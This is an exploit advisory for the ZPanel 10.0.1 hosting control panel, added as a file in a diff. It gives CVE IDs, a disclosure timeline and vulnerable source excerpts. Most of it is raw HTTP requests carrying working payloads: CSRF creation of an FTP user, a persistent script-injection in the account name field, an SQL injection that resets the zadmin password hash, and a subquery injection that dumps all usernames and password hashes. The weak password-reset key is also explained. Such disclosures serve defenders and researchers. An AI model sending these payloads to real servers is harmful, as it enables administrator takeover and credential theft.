@@ -1,0 +1,114 @@
+# Exploit Title: ZPanel <= 10.0.1 CSRF, XSS, SQLi, Password Reset
+# Date: 04/11/2012
+# Exploit Author: pcsjj
+# Vendor Homepage: http://www.zpanelcp.com/
+# Version: 10.0.1
+# Software Link: http://sourceforge.net/projects/zpanelcp/files/latest/download
+# Downloads: 90,382
+# CVE : CVE-2012-5683 (CSRF), CVE-2012-5684 (XSS), CVE-2012-5685(SQL Injection), CVE-2012-5686 (Password Reset)
+# I'm going to guess there are some more here.
+
+# 10/30/2012 - Contacted  developers.
+# 10/31/2012 - Developer states preference for reporting through bug tracker.
+# 11/04/2012 - Developer confirms preference for reporting through bug tracker.
+# 11/04/2012 - Vulnerability disclosed in bug tracker.
+
+# Insufficient CSRF protection (CVE-2012-5683)
+# All sensitive functions are lacking CSRF protection. One example below is
+a request showing no authorization token is required for the creation of a
+FTP user called "fun". This could also be used to deliver both XSS
+(CVE-2012-5684) and SQLi (CVE-2012-5685) examples below.
+#
+
+http://192.168.1.100/?module=ftp_management&action=CreateFTP
+
+POST /zpanel/?module=ftp_management&action=CreateFTP HTTP/1.1
+Host: 192.168.1.100
+Referer: http://192.168.1.100/?module=ftp_management
+Cookie: PHPSESSID=4rcq0qoqcdp5f3e65jiuvsujd2
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 107
+inFTPUsername=fun&inPassword=fun&inAccess=RW&inAutoHome=2&inDestination=&inDestination=&inSubmit=
+
+# Persistent XSS (CVE-2012-5684)
+# The "inFullname" parameter is vulnerable to XSS. User's real name is not
+being sanitized as it displayed within the control panel.
+#
+
+http://192.168.1.100/zpanel/?module=my_account&action=UpdateAccountSettings
+
+POST /?module=my_account&action=UpdateAccountSettings HTTP/1.1
+Host: 192.168.1.100
+Referer:
+http://192.168.1.100/zpanel/?module=my_account&action=UpdateAccountSettings
+Cookie: PHPSESSID=4rcq0qoqcdp5f3e65jiuvsujd2
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 143
+inFullname=Admin%3Cscript%3Ealert%28/fun/%29%3C%2Fscript%3E&inEmail=admin%
+40example.com&inPhone=101&inLanguage=en&inAddress=Home&inPostalCode=101
+
+# SQL Injection (CVE-2012-5685)
+# "inEmailAddress" parameter is vulnerable to SQL injection. Since the
+injection point is in an UPDATE statement its trivial to manipulate the
+content of the database. For instance the zadmin password could be changed
+to password.(5f4dcc3b5aa765d61d8327deb882cf99)
+#
+
+http://192.168.1.100/?module=manage_clients&action=UpdateClient
+
+POST /?module=manage_clients&action=UpdateClient HTTP/1.1
+Host: 192.168.182.128
+Referer: http://192.168.1.100/?module=manage_clients&show=Edit&other=5
+Cookie: PHPSESSID=4rcq0qoqcdp5f3e65jiuvsujd2
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 257
+inGroup=2&inPackage=2&inFullName=reseller&inEmailAddress=%27%2C+ac_pass_vc%3D%275f4dcc3b5aa765d61d8327deb882cf99%27%2C+ac_user_vc%3D%27zadmin%27+WHERE+ac_id_pk%3D1%3B--&inAddress=&inPostCode=&inPhone=101&inNewPassword=&inEnabled=1&inClientID=5&inSubmit=Save
+
+# One more sqli example
+# A user can extract data from db though an UPDATE statement by using a
+subquery. As long as we update a field that is displayed back to us. To
+reproduce this example you need to know your ClientID which can be found in
+the referring page's url as the value of "other". In this example we use
+the email field to hold the result of the subquery. Usually you can't
+select from the table you're updating but by creating a temporary table
+called "fun" we can avoid that. Using group_concat we get all columns and
+all rows as a single string so that it all fits nicely in a single field.
+#
+
+http://192.168.1.100/?module=manage_clients&action=UpdateClient
+
+POST /?module=manage_clients&action=UpdateClient HTTP/1.1
+Host: 192.168.1.100
+Referer: http://192.168.1.100/?module=manage_clients&show=Edit&other=5
+#<!---- 5 is the Client ID or ac_id_pk
+Cookie: PHPSESSID=4rcq0qoqcdp5f3e65jiuvsujd2
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 335
+inGroup=2&inPackage=2&inFullName=reseller&inEmailAddress=reseller%
+40example.com
+%27%2C+ac_email_vc%3D%28select+group_concat%28ac_user_vc%2C+ac_pass_vc%29+from+%28select+*+from+x_accounts%29+as+fun%29+where+ac_id_pk%3D%275%27%3B--&inAddress=&inPostCode=&inPhone=%2B44%281473%29+000+000&inNewPassword=&inEnabled=1&inClientID=5&inSubmit=Save
+
+# Password Reset Weakness, Insufficient entropy (CVE-2012-5686)
+# "randomkey" is not sufficiently random. By knowing server time an
+attacker could reset a password and guess the key within a relatively low
+number of requests.  If the attacker can receive a password reset email for
+any account on the system (demo account?) the number of attempts required
+to guess reset key for another user (zadmin) can be greatly reduced.  Since
+the zadmin default admin account is "hard coded" it is especially at risk
+to this password reset weakness. If you change zadmin username in the
+zpanel_core db my experience is that you cannot load zpanel control panel.
+#
+
+# ZPanel source code for [INSTALL_DIR]/inc/init.inc.php
+ 38    $randomkey = sha1(microtime());
+ 46      $zdbh->exec("UPDATE x_accounts SET ac_resethash_tx = '" .
+$randomkey . "' WHERE ac_id_pk=" . $result['ac_id_pk'] . "");
+ 50      $phpmailer->Body = "Hi " . $result['ac_user_vc'] . ",
+ 51     You or somebody pretending to be you has requested a password reset
+link to be sent for your web hosting control panel login at: " .
+ctrl_options::GetOption('cp_url') . "
+ 52    If you wish to proceed with the password reset on your account
+please use this link below to be taken to the password reset page.
+ 53    http://" . ctrl_options::GetOption('zpanel_domain') . "/?resetkey="
+. $randomkey . "
+ 54     ";
